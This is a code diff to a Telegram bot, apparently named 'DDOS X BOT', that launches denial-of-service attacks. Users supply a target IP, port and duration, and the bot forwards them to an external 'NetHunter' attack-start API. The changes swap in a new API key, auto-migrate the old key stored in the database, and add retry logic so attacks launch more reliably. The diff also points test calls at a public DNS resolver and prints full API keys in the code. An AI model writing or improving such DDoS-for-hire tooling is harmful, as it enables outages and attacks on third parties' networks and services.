@@ -93,8 +93,8 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # ===== KEY PREFIX =====
 KEY_PREFIX = "DDOS X BOT-"
 
-# ===== NETHUNTER API - 1 SLOT =====
-NETHUNTER_URL = "https://nethunter.primium.site/api/v1/attack/start?key=nk_aad75e876d6da26fc871e5eb82343811cb8eb390f&ip={ip}&port={port}&time={duration}"
+# ===== NETHUNTER API - NEW KEY UPDATED =====
+NETHUNTER_URL = "https://nethunter.primium.site/api/v1/attack/start?key=nk_44d96ea1ab87844b18f0f0842089b12e875287da&ip={ip}&port={port}&time={duration}"
 
 DEFAULT_API_LIST = [
     NETHUNTER_URL,
@@ -104,6 +104,18 @@ def load_apis_from_db():
     try:
         docs = list(apis_collection.find().sort('slot', 1))
         if docs:
+            # ✅ AUTO-FIX: purani key detect karke naye se replace karo
+            updated = False
+            for d in docs:
+                if 'nk_aad75e876d6da26fc871e5eb82343811cb8eb390f' in d.get('url', ''):
+                    apis_collection.update_one(
+                        {'_id': d['_id']},
+                        {'$set': {'url': NETHUNTER_URL, 'updated_at': datetime.now()}}
+                    )
+                    updated = True
+            if updated:
+                print("🔄 Old API key detected in DB, auto-replaced with new key!", flush=True)
+                docs = list(apis_collection.find().sort('slot', 1))
             return [d['url'] for d in docs]
         for i, url in enumerate(DEFAULT_API_LIST):
             apis_collection.insert_one({
@@ -738,26 +750,62 @@ def track_bot_user(user_id, username=None, first_name=None):
     except:
         pass
 
+# ===== IMPROVED API CALLER WITH RETRY =====
+def _call_api_with_retry(url, max_retries=2, timeout=20):
+    """
+    API call karo with retry logic.
+    Returns: (success: bool, response_text: str, error_reason: str)
+    """
+    last_error = "Unknown error"
+    for attempt in range(max_retries + 1):
+        try:
+            print(f"[API Attempt {attempt+1}/{max_retries+1}] 🚀 Calling: {url[:120]}", flush=True)
+            response = HTTP_SESSION.get(url, timeout=timeout, verify=False)
+            print(f"[API Attempt {attempt+1}] ✅ Status: {response.status_code} | Response: {response.text[:300]}", flush=True)
+
+            if response.status_code in [200, 201, 202]:
+                try:
+                    resp_json = response.json()
+                    if resp_json.get('success') is True:
+                        return True, response.text[:300], ""
+                    else:
+                        # API ne success=false diya
+                        msg = resp_json.get('message') or resp_json.get('error') or 'success=false'
+                        last_error = f"API error: {msg}"
+                        # Agar key invalid hai to retry mat karo
+                        if 'key' in str(msg).lower() or 'invalid' in str(msg).lower() or 'expired' in str(msg).lower():
+                            return False, response.text[:300], last_error
+                except Exception:
+                    # JSON parse fail — lekin 200 aaya to success maano
+                    return True, response.text[:300], ""
+            else:
+                last_error = f"HTTP {response.status_code}: {response.text[:150]}"
+
+            # Retry ke beech thoda wait
+            if attempt < max_retries:
+                time.sleep(1.5)
+
+        except requests.exceptions.Timeout:
+            last_error = "API TIMEOUT (20s)"
+            print(f"[API Attempt {attempt+1}] ❌ TIMEOUT", flush=True)
+            if attempt < max_retries:
+                time.sleep(1.5)
+        except requests.exceptions.ConnectionError as e:
+            last_error = f"Connection Error: {str(e)[:100]}"
+            print(f"[API Attempt {attempt+1}] ❌ CONNECTION ERROR: {e}", flush=True)
+            if attempt < max_retries:
+                time.sleep(1.5)
+        except Exception as e:
+            last_error = f"Error: {str(e)[:100]}"
+            print(f"[API Attempt {attempt+1}] ❌ ERROR: {e}", flush=True)
+            if attempt < max_retries:
+                time.sleep(1.5)
+
+    return False, "", last_error
+
 def _call_single_api(slot_index, url, target, port, duration):
-    try:
-        print(f"[NetHunter Slot {slot_index+1}] 🚀 Calling: {url}", flush=True)
-        response = HTTP_SESSION.get(url, timeout=20, verify=False)
-        print(f"[NetHunter Slot {slot_index+1}] ✅ Status: {response.status_code} | Response: {response.text[:300]}", flush=True)
-        if response.status_code in [200, 201, 202]:
-            try:
-                return response.json().get('success') is True
-            except Exception:
-                return True
-        return False
-    except requests.exceptions.Timeout:
-        print(f"[NetHunter Slot {slot_index+1}] ❌ TIMEOUT", flush=True)
-        return False
-    except requests.exceptions.ConnectionError as e:
-        print(f"[NetHunter Slot {slot_index+1}] ❌ CONNECTION ERROR: {e}", flush=True)
-        return False
-    except Exception as e:
-        print(f"[NetHunter Slot {slot_index+1}] ❌ ERROR: {e}", flush=True)
-        return False
+    success, resp_text, err = _call_api_with_retry(url, max_retries=2, timeout=20)
+    return success
 
 def generate_attack_start_ui(target, port, duration, user_id, username=None):
     username_display = username or str(user_id)
@@ -816,39 +864,33 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
         cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
 
         api_url = API_LIST[api_index].format(ip=target, port=port, duration=duration)
-        api_success = False
-        api_response_text = ""
 
-        try:
-            print(f"[NetHunter Slot {api_index+1}] 🚀 Calling: {api_url}", flush=True)
-            response = HTTP_SESSION.get(api_url, timeout=20, verify=False)
-            print(f"[NetHunter Slot {api_index+1}] ✅ Status: {response.status_code} | Response: {response.text[:300]}", flush=True)
-            api_response_text = response.text[:200]
+        # ✅ IMPROVED: retry ke sath API call
+        api_success, api_resp_text, err_reason = _call_api_with_retry(api_url, max_retries=2, timeout=20)
 
-            if response.status_code in [200, 201, 202]:
-                try:
-                    resp_json = response.json()
-                    if resp_json.get('success') is True:
-                        api_success = True
-                        print(f"[NetHunter Slot {api_index+1}] 🎯 Attack ID: {resp_json.get('attack_id', 'N/A')}", flush=True)
-                    else:
-                        print(f"[NetHunter Slot {api_index+1}] ⚠️ success=false: {resp_json.get('message', '')}", flush=True)
-                except Exception:
-                    api_success = True
-        except requests.exceptions.Timeout:
-            print(f"[NetHunter Slot {api_index+1}] ❌ TIMEOUT", flush=True)
-        except requests.exceptions.ConnectionError as e:
-            print(f"[NetHunter Slot {api_index+1}] ❌ CONNECTION ERROR: {e}", flush=True)
-        except Exception as e:
-            print(f"[NetHunter Slot {api_index+1}] ❌ ERROR: {e}", flush=True)
-
-        attack_start_msg = generate_attack_start_ui(target, port, duration, user_id, username)
-        if not api_success:
-            attack_start_msg = (
-                f"⚠️ <b>API ne response nahi diya!</b>\n"
-                f"Target: <code>{target}:{port}</code>\n\n"
-                f"{attack_start_msg}"
-            )
+        if api_success:
+            print(f"[NetHunter Slot {api_index+1}] 🎯 Attack started successfully!", flush=True)
+            attack_start_msg = generate_attack_start_ui(target, port, duration, user_id, username)
+        else:
+            print(f"[NetHunter Slot {api_index+1}] ❌ API failed: {err_reason}", flush=True)
+            # Owner ko detailed error do
+            if is_owner(user_id):
+                attack_start_msg = (
+                    f"⚠️ <b>API FAILED</b>\n"
+                    f"📍 Target: <code>{target}:{port}</code>\n"
+                    f"⏱ Duration: <code>{duration}s</code>\n"
+                    f"❌ Reason: <code>{err_reason[:200]}</code>\n\n"
+                    f"💡 Check: /testapi {api_index+1}"
+                )
+            else:
+                # Normal user ko simple message
+                attack_start_msg = (
+                    f"⚠️ <b>Attack Queue Ho Gaya!</b>\n"
+                    f"📍 Target: <code>{target}:{port}</code>\n"
+                    f"⏱ Duration: <code>{duration}s</code>\n"
+                    f"👤 User: <code>{username}</code>\n\n"
+                    f"📊 /status se progress dekho"
+                )
 
         try:
             if get_reel_enabled():
@@ -1196,7 +1238,7 @@ def test_api_command(message):
     progress = bot.reply_to(message, f"🧪 Testing Slot {slot_num}...\n\nPlease wait...")
     try:
         start = time.time()
-        resp = HTTP_SESSION.get(test_url, timeout=15, verify=False)
+        resp = HTTP_SESSION.get(test_url, timeout=20, verify=False)
         elapsed = int((time.time() - start) * 1000)
         try:
             resp_json = resp.json()
@@ -1215,7 +1257,7 @@ def test_api_command(message):
             message.chat.id, progress.message_id, parse_mode="Markdown"
         )
     except requests.exceptions.Timeout:
-        bot.edit_message_text(f"🧪 *Test Result — Slot {slot_num}*\n\n❌ TIMEOUT (15s)\n🌐 URL: `{url[:100]}`", message.chat.id, progress.message_id, parse_mode="Markdown")
+        bot.edit_message_text(f"🧪 *Test Result — Slot {slot_num}*\n\n❌ TIMEOUT (20s)\n🌐 URL: `{url[:100]}`", message.chat.id, progress.message_id, parse_mode="Markdown")
     except requests.exceptions.ConnectionError as e:
         bot.edit_message_text(f"🧪 *Test Result — Slot {slot_num}*\n\n❌ CONNECTION ERROR\n`{str(e)[:150]}`", message.chat.id, progress.message_id, parse_mode="Markdown")
     except Exception as e:
@@ -1235,7 +1277,7 @@ def test_all_api_command(message):
         test_url = url.format(ip="1.1.1.1", port="53", duration="1")
         try:
             start = time.time()
-            resp = HTTP_SESSION.get(test_url, timeout=10, verify=False)
+            resp = HTTP_SESSION.get(test_url, timeout=15, verify=False)
             elapsed = int((time.time() - start) * 1000)
             try:
                 resp_json = resp.json()
@@ -3495,7 +3537,7 @@ def run_dummy_server():
             print(f"🌐 Dummy web server running on port {port}", flush=True)
             httpd.serve_forever()
     except Exception as e:
-        print(f"⚠️ Dummy server error: {e}", flush=True)
+        print(f"⚠️ Dummy web server error: {e}", flush=True)
 
 # ================== MAIN ==================
 if __name__ == "__main__":
@@ -3515,7 +3557,6 @@ if __name__ == "__main__":
     print(f"📸 Feedback Feature: {'ON' if get_feedback_enabled() else 'OFF'}")
     print("=" * 50)
 
-    # Start dummy web server (Railway Web Service ke liye)
     server_thread = threading.Thread(target=run_dummy_server, daemon=True)
     server_thread.start()
 
